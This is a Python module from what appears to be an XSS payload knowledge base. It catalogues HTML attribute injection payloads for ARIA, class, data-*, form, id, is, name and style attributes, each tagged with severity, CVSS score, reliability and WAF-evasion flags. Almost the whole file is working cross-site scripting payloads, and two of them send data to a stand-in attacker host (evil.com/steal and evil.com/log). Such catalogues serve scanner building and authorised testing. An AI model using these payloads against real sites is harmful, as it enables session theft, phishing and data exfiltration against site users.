#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

HTML Attribute Injection XSS Payloads
ARIA, class, data-*, form, id, is, name, style attributes.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === ARIA Attribute Payloads ===
ARIA_ATTRIBUTE_PAYLOADS = {
    "aria-label-injection": PayloadEntry(
        payload='<div aria-label="x" onfocus=alert(1) tabindex=0>Hover</div>',
        contexts=["aria_attribute", "html_content", "html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="ARIA label with event handler injection",
        tags=["aria", "attribute", "label", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "aria-describedby-clobbering": PayloadEntry(
        payload='<div aria-describedby="xss"><div id="xss"><img src=x onerror=alert(1)></div></div>',
        contexts=["aria_attribute", "html_content", "dom_clobbering"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="ARIA describedby DOM clobbering",
        tags=["aria", "describedby", "clobbering"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "aria-hidden-bypass": PayloadEntry(
        payload='<div aria-hidden="true"><script>alert(1)</script></div>',
        contexts=["aria_attribute", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="ARIA hidden does not prevent script execution",
        tags=["aria", "hidden", "script", "bypass"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Class Attribute Payloads ===
CLASS_ATTRIBUTE_PAYLOADS = {
    "class-injection-break": PayloadEntry(
        payload='x" onfocus=alert(1) class="',
        contexts=["class_attribute", "html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Class attribute breakout with event handler",
        tags=["class", "attribute", "breakout", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "class-css-injection": PayloadEntry(
        payload='<style>.xss{background:url(javascript:alert(1))}</style><div class="xss">XSS</div>',
        contexts=["class_attribute", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Class with CSS javascript URL (legacy)",
        tags=["class", "css", "url", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "class-framework-abuse": PayloadEntry(
        payload='<div class="ng-click:alert(1)">Click</div>',
        contexts=["class_attribute", "html_content", "angular"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Class-based Angular directive (legacy)",
        tags=["class", "angular", "directive", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Data Attribute Payloads ===
DATA_ATTRIBUTE_PAYLOADS = {
    "data-attr-framework": PayloadEntry(
        payload='<div data-ng-click="$event.target.ownerDocument.defaultView.alert(1)">Click</div>',
        contexts=["data_attribute", "html_content", "angular"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="data-ng-click Angular directive",
        tags=["data", "angular", "ng-click", "directive"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "data-vue-html": PayloadEntry(
        payload='<div data-v-html="userInput"></div>',
        contexts=["data_attribute", "html_content", "vue"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="data attribute Vue directive",
        tags=["data", "vue", "v-html", "directive"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "data-tooltip-xss": PayloadEntry(
        payload='<div data-tooltip="<img src=x onerror=alert(1)>" data-html="true">Hover</div>',
        contexts=["data_attribute", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="data-tooltip with HTML enabled",
        tags=["data", "tooltip", "html", "bootstrap"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "data-src-lazy": PayloadEntry(
        payload='<img data-src="x" onerror=alert(1) class="lazyload">',
        contexts=["data_attribute", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="data-src lazy loading with onerror",
        tags=["data", "src", "lazy", "onerror"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Form Attribute Payloads ===
FORM_ATTRIBUTE_PAYLOADS = {
    "form-action-xss": PayloadEntry(
        payload='<form action="javascript:alert(1)"><input type=submit></form>',
        contexts=["form_attribute", "action", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Form action with javascript protocol",
        tags=["form", "action", "javascript", "protocol"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "form-formaction": PayloadEntry(
        payload='<form><button formaction="javascript:alert(1)">Submit</button></form>',
        contexts=["form_attribute", "action", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Button formaction override",
        tags=["form", "formaction", "button", "override"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "form-action-data-uri": PayloadEntry(
        payload='<form action="data:text/html,<script>alert(1)</script>"><input type=submit></form>',
        contexts=["form_attribute", "action", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Form action with data URI",
        tags=["form", "action", "data", "uri"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "form-action-redirect": PayloadEntry(
        payload='<form action="https://evil.com/steal"><input type=submit></form>',
        contexts=["form_attribute", "action", "html_content", "url"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="Form action redirect to attacker server",
        tags=["form", "action", "redirect", "phishing"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "form-onfocusin": PayloadEntry(
        payload="<form onfocusin=alert(1)><input autofocus></form>",
        contexts=["form_attribute", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Form onfocusin with autofocus",
        tags=["form", "onfocusin", "autofocus", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "form-onsubmit": PayloadEntry(
        payload="<form onsubmit=alert(1)><input type=submit></form>",
        contexts=["form_attribute", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Form onsubmit event handler",
        tags=["form", "onsubmit", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === ID Attribute Payloads ===
ID_ATTRIBUTE_PAYLOADS = {
    "id-clobbering-window": PayloadEntry(
        payload='<img id="alert" src="x:alert(1)"><script>window.alert(1)</script>',
        contexts=["id_attribute", "html_content", "dom_clobbering"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="ID clobbering window property",
        tags=["id", "clobbering", "window", "property"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "id-location-hash": PayloadEntry(
        payload='<div id="xss"><img src=x onerror=alert(1)></div><script>location.hash="#xss"</script>',
        contexts=["id_attribute", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="ID with location hash navigation",
        tags=["id", "hash", "navigation", "scroll"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "id-querySelector": PayloadEntry(
        payload='<div id="x"><img src=x onerror=alert(1)></div><script>document.querySelector("#x").innerHTML</script>',
        contexts=["id_attribute", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="ID targeted by querySelector",
        tags=["id", "querySelector", "dom", "targeting"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Is Attribute (Custom Elements) Payloads ===
IS_ATTRIBUTE_PAYLOADS = {
    "is-custom-element": PayloadEntry(
        payload='<div is="xss-element"><script>alert(1)</script></div>',
        contexts=["is_attribute", "html_content", "custom_elements"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="is attribute for customized built-in element",
        tags=["is", "custom-element", "builtin", "extend"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "is-constructor-bypass": PayloadEntry(
        payload='<button is="xss-button" onclick=alert(1)>Click</button>',
        contexts=["is_attribute", "html_content", "custom_elements"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Customized button with event handler",
        tags=["is", "custom-element", "button", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Name Attribute Payloads ===
NAME_ATTRIBUTE_PAYLOADS = {
    "name-clobbering": PayloadEntry(
        payload='<form name="x"><input name="y" value="<img src=x onerror=alert(1)>"></form><script>document.x.y.value</script>',
        contexts=["name_attribute", "html_content", "dom_clobbering"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Name attribute DOM clobbering",
        tags=["name", "clobbering", "form", "document"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "name-window-clobbering": PayloadEntry(
        payload='<iframe name="alert"></iframe><script>window.alert=function(x){console.log(x)}</script>',
        contexts=["name_attribute", "html_content", "dom_clobbering"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Iframe name window clobbering",
        tags=["name", "iframe", "window", "clobbering"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "name-anchor": PayloadEntry(
        payload='<a name="x" href="javascript:alert(1)">XSS</a>',
        contexts=["name_attribute", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Anchor name with javascript href",
        tags=["name", "anchor", "href", "javascript"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Style Attribute Payloads ===
STYLE_ATTRIBUTE_PAYLOADS = {
    "style-expression-ie": PayloadEntry(
        payload='<div style="width:expression(alert(1))">XSS</div>',
        contexts=["style_attribute", "html_content", "css"],
        severity=Severity.CRITICAL,
        cvss_score=8.0,
        description="CSS expression (IE only)",
        tags=["style", "expression", "ie", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "style-javascript-url": PayloadEntry(
        payload='<div style="background:url(javascript:alert(1))">XSS</div>',
        contexts=["style_attribute", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Style background javascript URL (legacy)",
        tags=["style", "background", "javascript", "url"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "style-behavior-ie": PayloadEntry(
        payload='<div style="behavior:url(xss.htc)">XSS</div>',
        contexts=["style_attribute", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="CSS behavior HTC file (IE only)",
        tags=["style", "behavior", "htc", "ie"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "style-moz-binding": PayloadEntry(
        payload='<div style="-moz-binding:url(xss.xml#xss)">XSS</div>',
        contexts=["style_attribute", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Mozilla XBL binding (legacy Firefox)",
        tags=["style", "moz-binding", "xbl", "firefox"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "style-breakout": PayloadEntry(
        payload="x;background:url(https://evil.com/log)",
        contexts=["style_attribute", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Style attribute value breakout",
        tags=["style", "breakout", "background", "url"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# Combined database
ATTRIBUTE_INJECTION_PAYLOADS = {
    **ARIA_ATTRIBUTE_PAYLOADS,
    **CLASS_ATTRIBUTE_PAYLOADS,
    **DATA_ATTRIBUTE_PAYLOADS,
    **FORM_ATTRIBUTE_PAYLOADS,
    **ID_ATTRIBUTE_PAYLOADS,
    **IS_ATTRIBUTE_PAYLOADS,
    **NAME_ATTRIBUTE_PAYLOADS,
    **STYLE_ATTRIBUTE_PAYLOADS,
}

ATTRIBUTE_INJECTION_TOTAL = len(ATTRIBUTE_INJECTION_PAYLOADS)
